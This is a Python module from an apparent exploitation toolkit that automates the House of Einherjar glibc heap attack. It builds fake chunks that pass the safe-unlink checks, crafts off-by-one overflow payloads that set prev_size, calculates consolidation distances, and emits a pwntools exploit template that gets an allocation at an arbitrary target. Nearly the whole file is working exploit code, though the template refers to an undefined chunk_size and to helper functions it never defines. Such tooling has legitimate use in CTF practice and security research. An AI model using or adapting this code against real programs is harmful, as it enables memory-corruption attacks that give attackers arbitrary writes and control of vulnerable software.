"""
House of Einherjar Heap Exploitation Technique.

Exploits the backward consolidation mechanism in glibc malloc to get
arbitrary write by creating a fake chunk and manipulating prev_size.
"""

from dataclasses import dataclass, field
from typing import Any, Dict, List, Optional, Set, Tuple

from supwngo.utils.logging import get_logger

logger = get_logger(__name__)


@dataclass
class FakeChunk:
    """Represents a fake chunk for House of Einherjar."""
    address: int
    size: int
    fd: int = 0
    bk: int = 0
    fd_nextsize: int = 0
    bk_nextsize: int = 0

    def build(self, bits: int = 64) -> bytes:
        """Build fake chunk bytes."""
        if bits == 64:
            from pwn import p64
            chunk = b''
            chunk += p64(0)  # prev_size (not used)
            chunk += p64(self.size | 0x1)  # size with PREV_INUSE
            chunk += p64(self.fd)
            chunk += p64(self.bk)
            chunk += p64(self.fd_nextsize)
            chunk += p64(self.bk_nextsize)
            return chunk
        else:
            from pwn import p32
            chunk = b''
            chunk += p32(0)
            chunk += p32(self.size | 0x1)
            chunk += p32(self.fd)
            chunk += p32(self.bk)
            return chunk


@dataclass
class EinherjarExploit:
    """House of Einherjar exploit setup."""
    target_address: int      # Where we want to allocate
    overflow_chunk: int      # Address of chunk with off-by-one overflow
    fake_chunk_location: int # Where to place fake chunk
    prev_size: int           # prev_size to set (distance to fake chunk)
    allocation_size: int     # Size to request to get our target
    notes: List[str] = field(default_factory=list)


class HouseOfEinherjar:
    """
    House of Einherjar exploitation technique.

    This technique exploits:
    1. Off-by-one null byte overflow
    2. Backward chunk consolidation

    Requirements:
    - Off-by-one overflow (null byte) into next chunk's size
    - Ability to control chunk allocation
    - Heap leak (to calculate addresses)

    Effect:
    - Allocate chunk at arbitrary location
    - Usually target stack, .bss, or controlled area
    """

    def __init__(self, bits: int = 64, heap_base: int = 0):
        """
        Initialize House of Einherjar helper.

        Args:
            bits: Architecture bits
            heap_base: Known heap base address
        """
        self.bits = bits
        self.word_size = bits // 8
        self.heap_base = heap_base

    def setup_exploit(
        self,
        overflow_chunk_addr: int,
        overflow_chunk_size: int,
        target_addr: int,
    ) -> EinherjarExploit:
        """
        Set up House of Einherjar exploit.

        Args:
            overflow_chunk_addr: Address of chunk with overflow
            overflow_chunk_size: Size of overflow chunk
            target_addr: Where we want to allocate

        Returns:
            EinherjarExploit with setup details
        """
        # Calculate where to place fake chunk
        # Fake chunk should be at target_addr - 0x10 (to account for chunk header)
        fake_chunk_addr = target_addr - (2 * self.word_size)

        # The prev_size we need to set
        # This is the distance from the overflowed chunk to the fake chunk
        next_chunk_addr = overflow_chunk_addr + overflow_chunk_size
        prev_size = next_chunk_addr - fake_chunk_addr

        # Allocation size to get our target
        # After consolidation, the consolidated chunk will be large
        # We need to request a size that will return our target
        allocation_size = overflow_chunk_size + 0x20

        exploit = EinherjarExploit(
            target_address=target_addr,
            overflow_chunk=overflow_chunk_addr,
            fake_chunk_location=fake_chunk_addr,
            prev_size=prev_size,
            allocation_size=allocation_size,
        )

        exploit.notes.append(f"1. Allocate chunk at {hex(overflow_chunk_addr)} with size {hex(overflow_chunk_size)}")
        exploit.notes.append(f"2. Allocate chunk right after (this will be overflowed into)")
        exploit.notes.append(f"3. Set up fake chunk at {hex(fake_chunk_addr)}")
        exploit.notes.append(f"4. Use off-by-one to clear PREV_INUSE and set prev_size={hex(prev_size)}")
        exploit.notes.append(f"5. Free the overflowed chunk to trigger consolidation")
        exploit.notes.append(f"6. Allocate {hex(allocation_size)} to get chunk at target")

        return exploit

    def build_fake_chunk(
        self,
        target_addr: int,
        size: int = 0x100,
    ) -> bytes:
        """
        Build a fake chunk for the exploit.

        Args:
            target_addr: Target address for fake chunk
            size: Size field value

        Returns:
            Fake chunk bytes
        """
        try:
            from pwn import p64, p32
            pack = p64 if self.bits == 64 else p32
        except ImportError:
            def pack(x):
                return x.to_bytes(self.word_size, 'little')

        # Fake chunk structure
        fake = b''
        fake += pack(0)  # prev_size
        fake += pack(size | 0x1)  # size with PREV_INUSE set

        # fd and bk must pass: P->fd->bk == P && P->bk->fd == P
        # For safe unlink bypass, point fd and bk to fake chunk address
        fake_chunk_addr = target_addr - (2 * self.word_size)
        fake += pack(fake_chunk_addr)  # fd
        fake += pack(fake_chunk_addr)  # bk

        return fake

    def build_overflow_payload(
        self,
        data: bytes,
        prev_size: int,
    ) -> bytes:
        """
        Build payload for off-by-one overflow.

        Args:
            data: Data for the chunk
            prev_size: prev_size to set in next chunk

        Returns:
            Payload bytes
        """
        try:
            from pwn import p64, p32
            pack = p64 if self.bits == 64 else p32
        except ImportError:
            def pack(x):
                return x.to_bytes(self.word_size, 'little')

        payload = data
        payload += pack(prev_size)  # Set prev_size of next chunk
        # The null byte will clear PREV_INUSE of next chunk

        return payload

    def generate_exploit_template(
        self,
        exploit: EinherjarExploit,
    ) -> str:
        """Generate exploit template code."""
        return f'''
#!/usr/bin/env python3
"""
House of Einherjar Exploit Template
Target: {hex(exploit.target_address)}
"""
from pwn import *

# Addresses (update these)
OVERFLOW_CHUNK = {hex(exploit.overflow_chunk)}
FAKE_CHUNK = {hex(exploit.fake_chunk_location)}
TARGET = {hex(exploit.target_address)}
PREV_SIZE = {hex(exploit.prev_size)}

def exploit():
    # Step 1: Allocate chunks
    # Chunk A: The one we'll overflow from
    chunk_a = alloc(0x{exploit.allocation_size:x})

    # Chunk B: The one that will be consolidated (must be large, not in tcache)
    chunk_b = alloc(0x100)

    # Step 2: Set up fake chunk
    # Place fake chunk structure in memory (e.g., via chunk_a data)
    fake_chunk = flat(
        0,              # prev_size (not used)
        0x101,          # size with PREV_INUSE
        FAKE_CHUNK,     # fd -> points to itself (unlink bypass)
        FAKE_CHUNK,     # bk -> points to itself
    )
    edit(chunk_a, fake_chunk)

    # Step 3: Overflow to clear PREV_INUSE and set prev_size
    overflow_payload = b'A' * (chunk_size - 0x10)  # Fill chunk
    overflow_payload += p64(PREV_SIZE)  # Set prev_size
    # The null byte terminator clears PREV_INUSE
    edit(chunk_a, overflow_payload)

    # Step 4: Free chunk_b to trigger backward consolidation
    # glibc will think prev chunk starts at FAKE_CHUNK
    # and consolidate backward to that address
    free(chunk_b)

    # Step 5: Allocate to get chunk at target
    # The consolidated chunk is now from FAKE_CHUNK to chunk_b
    # Allocate appropriately sized chunk to get our target
    evil_chunk = alloc(0x{exploit.allocation_size:x})

    # evil_chunk should now overlap with TARGET
    print(f"Got allocation at {{hex(evil_chunk)}}")

if __name__ == "__main__":
    exploit()
'''


class HouseOfEinherjarModern:
    """
    Modern House of Einherjar variant for glibc 2.29+.

    Handles additional security checks in newer glibc versions:
    - prev_size == chunk->size check
    - Enhanced unlink checks
    """

    def __init__(self, bits: int = 64):
        """Initialize modern variant."""
        self.bits = bits
        self.word_size = bits // 8

    def check_requirements(self, glibc_version: str) -> List[str]:
        """
        Check what's needed for this glibc version.

        Args:
            glibc_version: Version string like "2.31"

        Returns:
            List of requirement notes
        """
        requirements = []

        try:
            major, minor = map(int, glibc_version.split('.'))
            version = major * 100 + minor
        except:
            version = 0

        if version >= 229:
            requirements.append("glibc 2.29+: prev_size must match chunk size")
            requirements.append("Need heap leak for fake chunk address")

        if version >= 232:
            requirements.append("glibc 2.32+: Safe-linking in tcache/fastbins")
            requirements.append("May need additional heap leak")

        if version >= 234:
            requirements.append("glibc 2.34+: Hooks removed (__free_hook, etc.)")
            requirements.append("Consider alternative targets (GOT, stack)")

        return requirements

    def calculate_consolidation_distance(
        self,
        freed_chunk_addr: int,
        target_addr: int,
    ) -> int:
        """
        Calculate distance for backward consolidation.

        Args:
            freed_chunk_addr: Address of chunk to free
            target_addr: Where we want consolidated chunk

        Returns:
            Value for prev_size field
        """
        # prev_size = freed_chunk - target
        # Must account for chunk header
        chunk_header = freed_chunk_addr - (2 * self.word_size)
        target_data = target_addr - (2 * self.word_size)

        return chunk_header - target_data

    def build_safe_unlink_fake_chunk(
        self,
        fake_addr: int,
        target_size: int,
    ) -> bytes:
        """
        Build fake chunk that passes unlink security checks.

        For safe unlinking:
        - P->fd->bk == P
        - P->bk->fd == P

        Args:
            fake_addr: Address where fake chunk is placed
            target_size: Size for fake chunk

        Returns:
            Fake chunk bytes
        """
        try:
            from pwn import p64, p32
            pack = p64 if self.bits == 64 else p32
        except ImportError:
            def pack(x):
                return x.to_bytes(self.word_size, 'little')

        # For safe unlink, fd and bk point to &chunk - offset
        # Such that *(fd + offset) == chunk and *(bk + offset) == chunk
        # Simplest case: point to itself

        fake = b''
        fake += pack(0)  # prev_size
        fake += pack(target_size | 0x1)  # size with PREV_INUSE

        # fd and bk for unlink check bypass
        # Point to fake_addr so fd->bk == fake_addr == P
        fake += pack(fake_addr)  # fd
        fake += pack(fake_addr)  # bk

        return fake
